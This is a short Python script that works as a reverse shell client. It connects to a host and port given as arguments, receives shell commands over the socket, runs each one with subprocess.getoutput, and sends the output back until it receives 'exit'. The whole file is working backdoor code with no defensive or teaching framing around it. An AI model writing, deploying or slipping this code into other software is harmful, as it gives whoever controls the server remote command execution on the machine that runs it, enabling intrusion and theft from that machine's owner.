import socket
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = int(sys.argv[2])
#BUFFER_SIZE = 1024

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# receive the greeting message
message = s.recv(1024).decode()
print("Server:", message)

while True:
    # receive the command from the server
    command = s.recv(1024).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
    
    # Check if the connection is still alive passively, if not alive then quit
# close client connection
s.close()
